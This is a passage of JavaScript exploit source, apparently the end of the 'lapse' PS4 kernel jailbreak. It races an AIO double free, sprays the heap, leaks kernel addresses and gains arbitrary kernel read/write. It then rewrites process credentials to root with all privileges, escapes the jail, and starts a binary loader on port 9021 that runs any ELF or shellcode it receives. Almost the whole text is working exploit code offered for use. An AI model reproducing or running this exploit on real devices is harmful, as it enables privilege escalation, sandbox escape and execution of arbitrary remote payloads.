        kernel.write_qword(reclaimer_pktopts + OFF_IP6PO_RTHDR, 0n);
        kernel.write_qword(worker_pktopts + OFF_IP6PO_RTHDR, 0n);

        // Increase ref counts to prevent deallocation
        const sock_increase_ref = [
            ipv6_kernel_rw.data.master_sock,
            ipv6_kernel_rw.data.victim_sock,
            master_sock,
            worker_sock,
            reclaim_sock,
        ];

        for (const sock of sock_increase_ref) {
            const sock_addr = get_fd_data_addr(Number(sock), kernel.read_qword.bind(kernel));
            kernel.write_dword(sock_addr + 0x0n, 0x100n);  // so_count
        }

        logger.log("fixes applied");

    } catch (e) {
        logger.log("make_kernel_arw error: " + e.message);
        if (e.stack) logger.log(e.stack);
        throw e;
    }
}

//
// Detect firmware version by trying known EVF offsets
//
function detect_firmware_version() {
    const evf_ptr = kernel.inside_kdata;
    logger.log("EVF string pointer: " + hex(evf_ptr));

    // Try each known firmware version
    for (const fw_version in PS4_KERNEL_OFFSETS) {
        const offsets = PS4_KERNEL_OFFSETS[fw_version];
        const candidate_kbase = evf_ptr - offsets.EVF_OFFSET;

        // Check if this looks like a valid kernel base (page aligned)
        if ((candidate_kbase & 0xfffn) !== 0n) {
            continue;
        }

        // Verify ELF header at candidate base
        try {
            const b0 = kernel.read_byte(candidate_kbase);
            const b1 = kernel.read_byte(candidate_kbase + 1n);
            const b2 = kernel.read_byte(candidate_kbase + 2n);
            const b3 = kernel.read_byte(candidate_kbase + 3n);

            if (b0 === 0x7F && b1 === 0x45 && b2 === 0x4C && b3 === 0x46) {
                logger.log("Detected firmware: " + fw_version);
                logger.log("Kernel base: " + hex(candidate_kbase));
                kernel.data_base = candidate_kbase;
                selected_fw_offsets = offsets;
                return fw_version;
            }
        } catch (e) {
            // Skip this candidate
        }
    }

    return null;
}

//
// Post exploitation - sandbox escape and privilege escalation
//
function post_exploitation_ps4() {
    logger.log("Starting post exploitation...");

    // Detect firmware version
    const fw_version = detect_firmware_version();
    if (fw_version === null) {
        logger.log("ERROR: Could not detect firmware version");
        logger.log("Firmware not supported for jailbreaking");
        return false;
    }

    // Verify ELF header
    const b0 = kernel.read_byte(kernel.data_base);
    const b1 = kernel.read_byte(kernel.data_base + 1n);
    const b2 = kernel.read_byte(kernel.data_base + 2n);
    const b3 = kernel.read_byte(kernel.data_base + 3n);

    logger.log("ELF header bytes at " + hex(kernel.data_base) + ":");
    logger.log("  [0] = 0x" + b0.toString(16).padStart(2, '0'));
    logger.log("  [1] = 0x" + b1.toString(16).padStart(2, '0'));
    logger.log("  [2] = 0x" + b2.toString(16).padStart(2, '0'));
    logger.log("  [3] = 0x" + b3.toString(16).padStart(2, '0'));

    if (b0 === 0x7F && b1 === 0x45 && b2 === 0x4C && b3 === 0x46) {
        logger.log("ELF header verified - kernel base is valid");
    } else {
        logger.log("ERROR: ELF header mismatch - check base address");
        return false;
    }

    // Get addresses from offsets
    const PRISON0_ADDR = kernel.data_base + selected_fw_offsets.PRISON0;
    const ROOTVNODE_ADDR = kernel.data_base + selected_fw_offsets.ROOTVNODE;

    logger.log("PRISON0 @ " + hex(PRISON0_ADDR));
    logger.log("ROOTVNODE @ " + hex(ROOTVNODE_ADDR));

    // ucred offsets
    const OFFSET_P_UCRED = 0x40n;
    const OFFSET_CR_UID = 0x04n;
    const OFFSET_CR_RUID = 0x08n;
    const OFFSET_CR_SVUID = 0x0Cn;
    const OFFSET_CR_NGROUPS = 0x10n;
    const OFFSET_CR_RGID = 0x14n;
    const OFFSET_CR_PRISON = 0x30n;
    const OFFSET_CR_SCEAUTHID = 0x58n;
    const OFFSET_CR_SCECAPS = 0x60n;
    const OFFSET_CR_SCECAPS2 = 0x68n;

    // filedesc offsets
    const OFFSET_FD_RDIR = 0x10n;
    const OFFSET_FD_JDIR = 0x18n;

    // Escape sandbox
    logger.log("Escaping sandbox...");

    // Get UID before jailbreak
    const uid_before = syscall(SYSCALL.getuid);
    logger.log("UID before: " + uid_before);

    const curproc = kernel.curproc;
    const proc_fd = kernel.read_qword(curproc + KERNEL_OFFSETS.PROC_FD);
    const ucred = kernel.read_qword(curproc + OFFSET_P_UCRED);

    logger.log("curproc = " + hex(curproc));
    logger.log("proc_fd = " + hex(proc_fd));
    logger.log("ucred = " + hex(ucred));

    // Set UID/GID to 0 (root)
    kernel.write_dword(ucred + OFFSET_CR_UID, 0);      // cr_uid
    kernel.write_dword(ucred + OFFSET_CR_RUID, 0);     // cr_ruid
    kernel.write_dword(ucred + OFFSET_CR_SVUID, 0);    // cr_svuid
    kernel.write_dword(ucred + OFFSET_CR_NGROUPS, 1);  // cr_ngroups
    kernel.write_dword(ucred + OFFSET_CR_RGID, 0);     // cr_rgid

    logger.log("Set UID/GID to root");

    // Escape jail - set prison to prison0
    const prison0 = kernel.read_qword(PRISON0_ADDR);
    kernel.write_qword(ucred + OFFSET_CR_PRISON, prison0);

    logger.log("Escaped jail (prison0 = " + hex(prison0) + ")");

    // Add SCE privileges (JIT, etc.)
    kernel.write_qword(ucred + OFFSET_CR_SCEAUTHID, 0x4800000000010003n);  // SYSTEM auth ID
    kernel.write_qword(ucred + OFFSET_CR_SCECAPS, 0xFFFFFFFFFFFFFFFFn);    // All caps
    kernel.write_qword(ucred + OFFSET_CR_SCECAPS2, 0xFFFFFFFFFFFFFFFFn);   // All caps

    logger.log("Set SCE privileges");

    // Set root directory to real root
    const rootvnode = kernel.read_qword(ROOTVNODE_ADDR);
    kernel.write_qword(proc_fd + OFFSET_FD_RDIR, rootvnode);  // fd_rdir
    kernel.write_qword(proc_fd + OFFSET_FD_JDIR, rootvnode);  // fd_jdir

    logger.log("Set root filesystem (rootvnode = " + hex(rootvnode) + ")");

    // Get UID after jailbreak to verify
    const uid_after = syscall(SYSCALL.getuid);
    logger.log("UID after: " + uid_after);

    if (uid_after !== 0n) {
        logger.log("ERROR: Failed to get root! UID is still " + uid_after);
        return false;
    }

    logger.log("");
    logger.log("===========================================");
    logger.log("  JAILBREAK COMPLETE!");
    logger.log("  Firmware: " + fw_version);
    logger.log("  UID: " + uid_before + " -> " + uid_after);
    logger.log("  Root access and jail escape achieved");
    logger.log("===========================================");

    return true;
}

//
// Setup AIO blocking and grooming
//
function setup(block_fd) {
    // Block AIO workers
    const reqs1 = malloc(0x28 * NUM_WORKERS);
    const block_id = malloc(4);

    for (let i = 0; i < NUM_WORKERS; i++) {
        write32_uncompressed(reqs1 + BigInt(i * 0x28 + 8), 1);  // nbyte
        write32_uncompressed(reqs1 + BigInt(i * 0x28 + 0x20), Number(block_fd));  // fd
    }

    aio_submit_cmd(AIO_CMD_READ, reqs1, NUM_WORKERS, block_id);

    // Heap grooming
    const num_reqs = 3;
    const groom_ids = malloc(4 * NUM_GROOMS);
    const greqs = make_reqs1(num_reqs);

    spray_aio(NUM_GROOMS, greqs, num_reqs, groom_ids, false);
    cancel_aios(groom_ids, NUM_GROOMS);

    return [block_id, groom_ids];
}

//
// Double free reqs2 (main race loop)
//
function double_free_reqs2(sds) {
    function htons(port) {
        return ((port & 0xff) << 8) | ((port >> 8) & 0xff);
    }

    function aton(ip) {
        const parts = ip.split(".");
        return (parseInt(parts[3]) << 24) | (parseInt(parts[2]) << 16) |
               (parseInt(parts[1]) << 8) | parseInt(parts[0]);
    }

    // Setup TCP server - use port 0 to let kernel assign, then connect to it
    const server_addr = malloc(16);
    // Clear the buffer first
    for (let i = 0; i < 16; i++) {
        write8_uncompressed(server_addr + BigInt(i), 0);
    }
    write8_uncompressed(server_addr + 1n, 2);  // AF_INET = 2
    write16_uncompressed(server_addr + 2n, 0);  // port 0 = auto-assign
    write32_uncompressed(server_addr + 4n, aton("127.0.0.1"));

    const sd_listen = new_tcp_socket();
    logger.log("sd_listen: " + sd_listen);

    const enable = malloc(4);
    write32_uncompressed(enable, 1);
    ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4n);

    let ret = syscall(SYSCALL.bind, sd_listen, server_addr, 16n);
    logger.log("bind returned: " + hex(ret));
    if (is_error(ret)) {
        throw new Error("bind failed");
    }

    // Get the assigned port
    const addr_len = malloc(4);
    write32_uncompressed(addr_len, 16);
    syscall(SYSCALL.getsockname, sd_listen, server_addr, addr_len);
    const assigned_port_be = Number(read16_uncompressed(server_addr + 2n));
    const assigned_port = ((assigned_port_be & 0xff) << 8) | ((assigned_port_be >> 8) & 0xff);
    logger.log("assigned port: " + assigned_port);

    ret = syscall(SYSCALL.listen, sd_listen, 1n);
    if (is_error(ret)) {
        throw new Error("listen failed");
    }

    // Race loop
    const num_reqs = 3;
    const which_req = num_reqs - 1;
    const reqs1 = make_reqs1(num_reqs);
    const aio_ids = malloc(4 * num_reqs);
    const req_addr = aio_ids + BigInt(which_req * 4);
    const cmd = AIO_CMD_MULTI_READ;

    for (let i = 0; i < NUM_RACES; i++) {
        const sd_client = new_tcp_socket();
        logger.log("race " + (i + 1) + "/" + NUM_RACES + " sd_client: " + sd_client);

        ret = syscall(SYSCALL.connect, sd_client, server_addr, 16n);
        if (is_error(ret)) {
            throw new Error("connect failed");
        }

        const sd_conn = syscall(SYSCALL.accept, sd_listen, 0n, 0n);
        if (is_error(sd_conn)) {
            throw new Error("accept failed");
        }
        logger.log("sd_conn: " + sd_conn);

        // Set linger option to force soclose to sleep
        const linger_buf = malloc(8);
        write32_uncompressed(linger_buf, 1);      // l_onoff
        write32_uncompressed(linger_buf + 4n, 1); // l_linger
        ssockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8n);

        // Set socket FD in AIO request
        write32_uncompressed(reqs1 + BigInt(which_req * 0x28 + 0x20), Number(sd_client));

        aio_submit_cmd(cmd, reqs1, num_reqs, aio_ids);
        aio_multi_cancel(aio_ids, num_reqs);
        aio_multi_poll(aio_ids, num_reqs);

        // Close client socket to allow fdrop in aio_multi_delete
        syscall(SYSCALL.close, sd_client);

        // Try to win the race
        const res = race_one(req_addr, sd_conn, sds);

        // Clean up AIOs
        aio_multi_delete(aio_ids, num_reqs);
        syscall(SYSCALL.close, sd_conn);

        if (res !== null) {
            logger.log("WON RACE at attempt " + (i + 1));
            syscall(SYSCALL.close, sd_listen);
            return res;
        }
    }

    throw new Error("failed aio double free after " + NUM_RACES + " attempts");
}

//
// Main exploit entry point
//
function run_lapse() {
    logger.log("=== lapse PS4 kernel exploit ===");

    // Initialize globals
    init_lapse_globals();

    // Initialize threading (get FPU/MXCSR from setjmp) - like PS5
    init_threading();

    // Pin to core and set priority
    pin_to_core(MAIN_CORE);
    set_rtprio(MAIN_RTPRIO);
    logger.log("pinned to core " + MAIN_CORE + " with rtprio " + hex(MAIN_RTPRIO));

    // Create blocking socket pair
    const sockpair = malloc(8);
    let ret = syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sockpair);
    if (is_error(ret)) {
        throw new Error("socketpair failed");
    }

    const block_fd = read32_uncompressed(sockpair);
    const unblock_fd = read32_uncompressed(sockpair + 4n);
    logger.log("block_fd=" + block_fd + " unblock_fd=" + unblock_fd);

    // Create UDP sockets for heap spray
    const sds = [];
    const sds_alt = [];

    for (let i = 0; i < NUM_SDS; i++) {
        sds.push(new_socket());
    }

    for (let i = 0; i < NUM_SDS_ALT; i++) {
        sds_alt.push(new_socket());
    }

    logger.log("created " + NUM_SDS + " + " + NUM_SDS_ALT + " sockets");

    let block_id = null;
    let groom_ids = null;

    try {
        // Setup AIO blocking and grooming
        logger.log("\n[+] Setup\n");
        [block_id, groom_ids] = setup(block_fd);

        // Double free AIO entry
        logger.log("\n[+] Double-free AIO\n");
        const sd_pair = double_free_reqs2(sds);

        logger.log("Got aliased socket pair: " + sd_pair[0] + " " + sd_pair[1]);

        logger.log("\n[+] Leak kernel addresses\n");
        const leak_result = leak_kernel_addrs(sd_pair, sds);
        logger.log("reqs1_addr = " + hex(leak_result.reqs1_addr));
        logger.log("kbuf_addr = " + hex(leak_result.kbuf_addr));
        logger.log("kernel_addr = " + hex(leak_result.kernel_addr));
        logger.log("target_id = " + hex(leak_result.target_id));
        logger.log("evf = " + leak_result.evf);
        logger.log("fake_reqs3_addr = " + hex(leak_result.fake_reqs3_addr));
        logger.log("fake_reqs3_sd = " + leak_result.fake_reqs3_sd);
        logger.log("aio_info_addr = " + hex(leak_result.aio_info_addr));

        logger.log("\n[+] Double free SceKernelAioRWRequest\n");
        const pktopts_sds = double_free_reqs1(
            leak_result.reqs1_addr,
            leak_result.target_id,
            leak_result.evf,
            sd_pair[0],
            sds,
            sds_alt,
            leak_result.fake_reqs3_addr
        );
        logger.log("Got aliased pktopts pair: " + pktopts_sds[0] + " " + pktopts_sds[1]);

        // Close the fake_reqs3_sd socket
        syscall(SYSCALL.close, leak_result.fake_reqs3_sd);

        logger.log("\n[+] Get arbitrary kernel read/write\n");
        make_kernel_arw(
            pktopts_sds,
            leak_result.reqs1_addr,
            leak_result.kernel_addr,
            sds,
            sds_alt,
            leak_result.aio_info_addr
        );

        logger.log("\n[+] Post exploitation\n");
        const jb_success = post_exploitation_ps4();

        if (jb_success) {
            logger.log("\n[+] Starting binary loader\n");
            bin_loader_main();
        }

    } catch (e) {
        logger.log("ERROR: " + e.message);
        if (e.stack) logger.log(e.stack);
    }

    // Cleanup
    logger.log("\ncleaning up...");

    syscall(SYSCALL.close, block_fd);
    syscall(SYSCALL.close, unblock_fd);

    if (groom_ids) {
        free_aios2(groom_ids, NUM_GROOMS);
    }

    if (block_id) {
        aio_multi_wait(block_id, 1);
        aio_multi_delete(block_id, 1);
    }

    for (const sd of sds) {
        syscall(SYSCALL.close, sd);
    }

    for (const sd of sds_alt) {
        syscall(SYSCALL.close, sd);
    }

    logger.log("cleanup complete");
}

//
// ============================================
// bin_loader_ps4.js - ELF/binary loader
// ============================================
//

// bin_loader constants
const BIN_LOADER_PORT = 9021;
const MAX_PAYLOAD_SIZE = 4 * 1024 * 1024;  // 4MB max
const READ_CHUNK = 4096;

// Thrd_create offset in libc.prx (verified via Ghidra)
const THRD_CREATE_OFFSET = 0x4c770n;

// ELF magic bytes
const ELF_MAGIC = 0x464C457F;

// mmap constants for bin_loader
const BL_MAP_PRIVATE = 0x2n;
const BL_MAP_ANONYMOUS = 0x1000n;
const BL_PROT_READ = 0x1n;
const BL_PROT_WRITE = 0x2n;
const BL_PROT_EXEC = 0x4n;

// ELF header structure offsets
const ELF_HEADER = {
    E_ENTRY: 0x18,
    E_PHOFF: 0x20,
    E_PHENTSIZE: 0x36,
    E_PHNUM: 0x38,
};

// Program header structure offsets
const PROGRAM_HEADER = {
    P_TYPE: 0x00,
    P_FLAGS: 0x04,
    P_OFFSET: 0x08,
    P_VADDR: 0x10,
    P_FILESZ: 0x20,
    P_MEMSZ: 0x28,
};

const PT_LOAD = 1;

// Helper: Check if we're jailbroken
function bl_is_jailbroken() {
    const uid = syscall(SYSCALL.getuid);
    const sandbox = syscall(SYSCALL.is_in_sandbox);
    return uid === 0n && sandbox === 0n;
}

// Helper: Round up to page boundary
function bl_round_up(x, base) {
    return Math.floor((x + base - 1) / base) * base;
}

// Read ELF header from buffer
function bl_read_elf_header(buf_addr) {
    return {
        magic: Number(read32_uncompressed(buf_addr)),
        e_entry: read64_uncompressed(buf_addr + BigInt(ELF_HEADER.E_ENTRY)),
        e_phoff: read64_uncompressed(buf_addr + BigInt(ELF_HEADER.E_PHOFF)),
        e_phentsize: Number(read16_uncompressed(buf_addr + BigInt(ELF_HEADER.E_PHENTSIZE))),
        e_phnum: Number(read16_uncompressed(buf_addr + BigInt(ELF_HEADER.E_PHNUM))),
    };
}

// Read program header from buffer
function bl_read_program_header(buf_addr, offset) {
    const base = buf_addr + BigInt(offset);
    return {
        p_type: Number(read32_uncompressed(base + BigInt(PROGRAM_HEADER.P_TYPE))),
        p_flags: Number(read32_uncompressed(base + BigInt(PROGRAM_HEADER.P_FLAGS))),
        p_offset: read64_uncompressed(base + BigInt(PROGRAM_HEADER.P_OFFSET)),
        p_vaddr: read64_uncompressed(base + BigInt(PROGRAM_HEADER.P_VADDR)),
        p_filesz: read64_uncompressed(base + BigInt(PROGRAM_HEADER.P_FILESZ)),
        p_memsz: read64_uncompressed(base + BigInt(PROGRAM_HEADER.P_MEMSZ)),
    };
}

// Load ELF segments into mmap'd memory
function bl_load_elf_segments(buf_addr, base_addr) {
    const elf = bl_read_elf_header(buf_addr);

    logger.log("ELF entry: " + hex(elf.e_entry));
    logger.flush();
    logger.log("Program headers: " + elf.e_phnum + " @ offset " + hex(elf.e_phoff));
    logger.flush();

    for (let i = 0; i < elf.e_phnum; i++) {
        const phdr_offset = Number(elf.e_phoff) + i * elf.e_phentsize;
        const segment = bl_read_program_header(buf_addr, phdr_offset);

        if (segment.p_type === PT_LOAD && segment.p_memsz > 0n) {
            const seg_offset = segment.p_vaddr & 0xffffffn;
            const seg_addr = base_addr + seg_offset;

            logger.log("Loading segment " + i + ":");
            logger.log("  vaddr: " + hex(segment.p_vaddr));
            logger.log("  filesz: " + hex(segment.p_filesz));
            logger.log("  -> " + hex(seg_addr));
            logger.flush();

            const filesz = Number(segment.p_filesz);
            const src_addr = buf_addr + segment.p_offset;

            for (let j = 0; j < filesz; j++) {
                const byte = read8_uncompressed(src_addr + BigInt(j));
                write8_uncompressed(seg_addr + BigInt(j), byte);
            }

            const memsz = Number(segment.p_memsz);
            for (let j = filesz; j < memsz; j++) {
                write8_uncompressed(seg_addr + BigInt(j), 0);
            }
        }
    }

    const entry_offset = elf.e_entry & 0xffffffn;
    return base_addr + entry_offset;
}

// BinLoader object
const BinLoader = {
    data: null,
    data_size: 0,
    mmap_base: 0n,
    mmap_size: 0,
    entry_point: 0n,
};

BinLoader.init = function(bin_data_addr, bin_size) {
    BinLoader.data = bin_data_addr;
    BinLoader.data_size = bin_size;
    BinLoader.mmap_size = bl_round_up(bin_size, PAGE_SIZE);

    const prot = BL_PROT_READ | BL_PROT_WRITE | BL_PROT_EXEC;
    const flags = BL_MAP_PRIVATE | BL_MAP_ANONYMOUS;

    const ret = syscall(
        477n,  // mmap
        0n,
        BigInt(BinLoader.mmap_size),
        prot,
        flags,
        0xffffffffffffffffn,
        0n
    );

    if (ret >= 0xffff800000000000n) {
        throw new Error("mmap failed: " + hex(ret));
    }

    BinLoader.mmap_base = ret;
    logger.log("mmap() allocated at: " + hex(BinLoader.mmap_base));
    logger.flush();

    const magic = Number(read32_uncompressed(bin_data_addr));

    if (magic === ELF_MAGIC) {
        logger.log("Detected ELF binary, parsing headers...");
        logger.flush();
        BinLoader.entry_point = bl_load_elf_segments(bin_data_addr, BinLoader.mmap_base);
    } else {
        logger.log("Non-ELF binary, treating as raw shellcode");
        logger.flush();
        for (let i = 0; i < bin_size; i++) {
            const byte = read8_uncompressed(bin_data_addr + BigInt(i));
            write8_uncompressed(BinLoader.mmap_base + BigInt(i), byte);
        }
        BinLoader.entry_point = BinLoader.mmap_base;
    }

    logger.log("Entry point: " + hex(BinLoader.entry_point));
    logger.flush();
};

// Spawn payload thread and wait using ROP
function spawn_payload_thread_and_wait(entry_point, args) {
    const Thrd_create = libc_base + THRD_CREATE_OFFSET;
    logger.log("libc_base @ " + hex(libc_base));
    logger.flush();
    logger.log("Thrd_create @ " + hex(Thrd_create));
    logger.flush();

    const pid = syscall(SYSCALL.getpid);
    logger.log("PID: " + pid);
    logger.flush();

    const thr_handle_addr = malloc(8);
    const timespec_addr = malloc(16);

    write64_uncompressed(timespec_addr, 0n);
    write64_uncompressed(timespec_addr + 8n, 250000000n);

    const rwpipe = malloc(8);
    const rwpair = malloc(8);

    write32_uncompressed(rwpipe, ipv6_kernel_rw.data.pipe_read_fd);
    write32_uncompressed(rwpipe + 0x4n, ipv6_kernel_rw.data.pipe_write_fd);

    write32_uncompressed(rwpair, Number(ipv6_kernel_rw.data.master_sock));
    write32_uncompressed(rwpair + 0x4n, Number(ipv6_kernel_rw.data.victim_sock));

    const payloadout = malloc(4);
    write64_uncompressed(args + 0x00n, syscall_wrapper - 0x7n);
    write64_uncompressed(args + 0x08n, rwpipe);
    write64_uncompressed(args + 0x10n, rwpair);
    write64_uncompressed(args + 0x18n, ipv6_kernel_rw.data.pipe_addr);
    write64_uncompressed(args + 0x20n, kernel.data_base);
    write64_uncompressed(args + 0x28n, payloadout);

    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n + 1n;

    let i = 0;

    // Thrd_create(thr_handle_addr, entry_point, args, 0, 0, 0)
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = thr_handle_addr;
    fake_rop[i++] = g.get('pop_rsi');
    fake_rop[i++] = entry_point;
    fake_rop[i++] = g.get('pop_rdx');
    fake_rop[i++] = args;
    fake_rop[i++] = g.get('pop_rcx');
    fake_rop[i++] = 0n;
    fake_rop[i++] = g.get('pop_r8');
    fake_rop[i++] = 0n;
    fake_rop[i++] = g.get('pop_r9');
    fake_rop[i++] = 0n;

    fake_rop[i++] = Thrd_create;

    // nanosleep
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = timespec_addr;
    fake_rop[i++] = g.get('pop_rsi');
    fake_rop[i++] = 0n;
    fake_rop[i++] = g.get('pop_rax');
    fake_rop[i++] = 0xf0n;
    fake_rop[i++] = syscall_wrapper;

    // kill(pid, SIGKILL)
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = pid;
    fake_rop[i++] = g.get('pop_rsi');
    fake_rop[i++] = 9n;
    fake_rop[i++] = g.get('pop_rax');
    fake_rop[i++] = 0x25n;
    fake_rop[i++] = syscall_wrapper;

    write64(add_rop_smash_code_store, 0xab00260325n);
    fake_rw[59] = (fake_frame & 0xffffffffn);
    rop_smash(fake_obj_arr[0]);
}

BinLoader.run = function() {
    logger.log("Spawning payload thread...");
    logger.flush();
    const args = malloc(0x30);
    spawn_payload_thread_and_wait(BinLoader.entry_point, args);
};

// Create listening socket for bin_loader
function bl_create_listen_socket(port) {
    const sd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
    if (is_error(sd)) {
        throw new Error("socket() failed");
    }

    const enable = malloc(4);
    write32_uncompressed(enable, 1);
    syscall(SYSCALL.setsockopt, sd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);

    const sockaddr = malloc(16);
    for (let j = 0; j < 16; j++) {
        write8_uncompressed(sockaddr + BigInt(j), 0);
    }
    write8_uncompressed(sockaddr + 1n, 2);  // AF_INET
    write8_uncompressed(sockaddr + 2n, (port >> 8) & 0xff);
    write8_uncompressed(sockaddr + 3n, port & 0xff);
    write32_uncompressed(sockaddr + 4n, 0);

    let ret = syscall(SYSCALL.bind, sd, sockaddr, 16n);
    if (is_error(ret)) {
        syscall(SYSCALL.close, sd);
        throw new Error("bind() failed");
    }

    ret = syscall(SYSCALL.listen, sd, 1n);
    if (is_error(ret)) {
        syscall(SYSCALL.close, sd);
        throw new Error("listen() failed");
    }

    return sd;
}

// Read payload data from client socket
function bl_read_payload_from_socket(client_sock, max_size) {
    const buf = malloc(READ_CHUNK);
    const payload_buf = malloc(max_size);
    let total_read = 0;

    while (total_read < max_size) {
        const read_size = syscall(
            SYSCALL.read,
            BigInt(client_sock),
            buf,
            BigInt(READ_CHUNK)
        );

        if (is_error(read_size)) {
            throw new Error("read() failed");
        }

        if (read_size === 0n) {
            break;
        }

        const bytes_read = Number(read_size);

        for (let j = 0; j < bytes_read; j++) {
            write8_uncompressed(payload_buf + BigInt(total_read + j),
                               read8_uncompressed(buf + BigInt(j)));
        }

        total_read += bytes_read;

        if (total_read % (64 * 1024) === 0) {
            logger.log("Received " + total_read + " bytes...");
        }
    }

    return { buf: payload_buf, size: total_read };
}

// Main bin_loader function
function bin_loader_main() {
    logger.log("=== PS4 Binary Loader ===");
    logger.flush();

    if (!bl_is_jailbroken()) {
        logger.log("ERROR: Console is not jailbroken");
        logger.flush();
        send_notification("Jailbreak failed!\nNot jailbroken.");
        return false;
    }

    logger.log("Console is jailbroken, starting payload server...");
    logger.flush();

    let server_sock;
    try {
        server_sock = bl_create_listen_socket(BIN_LOADER_PORT);
    } catch (e) {
        logger.log("ERROR: " + e.message);
        logger.flush();
        send_notification("Bin loader failed!\n" + e.message);
        return false;
    }

    // Get current IP and notify user
    const current_ip = get_current_ip();
    const network_str = (current_ip ? current_ip : "<PS4 IP>") + ":" + BIN_LOADER_PORT;

    logger.log("Listening on " + network_str);
    logger.log("Send your ELF payload to this address");
    logger.flush();
    send_notification("Binloader listening on:\n" + network_str);

    const sockaddr = malloc(16);
    const sockaddr_len = malloc(4);
    write32_uncompressed(sockaddr_len, 16);

    const client_sock = syscall(
        SYSCALL.accept,
        server_sock,
        sockaddr,
        sockaddr_len
    );

    if (is_error(client_sock)) {
        logger.log("ERROR: accept() failed");
        logger.flush();
        syscall(SYSCALL.close, server_sock);
        return false;
    }

    logger.log("Client connected");
    logger.flush();

    let payload;
    try {
        payload = bl_read_payload_from_socket(Number(client_sock), MAX_PAYLOAD_SIZE);
    } catch (e) {
        logger.log("ERROR reading payload: " + e.message);
        logger.flush();
        syscall(SYSCALL.close, client_sock);
        syscall(SYSCALL.close, server_sock);
        return false;
    }

    logger.log("Received " + payload.size + " bytes total");
    logger.flush();

    syscall(SYSCALL.close, client_sock);
    syscall(SYSCALL.close, server_sock);

    if (payload.size < 64) {
        logger.log("ERROR: Payload too small");
        logger.flush();
        return false;
    }

    try {
        BinLoader.init(payload.buf, payload.size);
        BinLoader.run();
        logger.log("Payload spawned successfully");
        logger.flush();
    } catch (e) {
        logger.log("ERROR loading payload: " + e.message);
        logger.flush();
        if (e.stack) logger.log(e.stack);
        logger.flush();
        return false;
    }

    return true;
}

// Run the exploit
run_lapse();
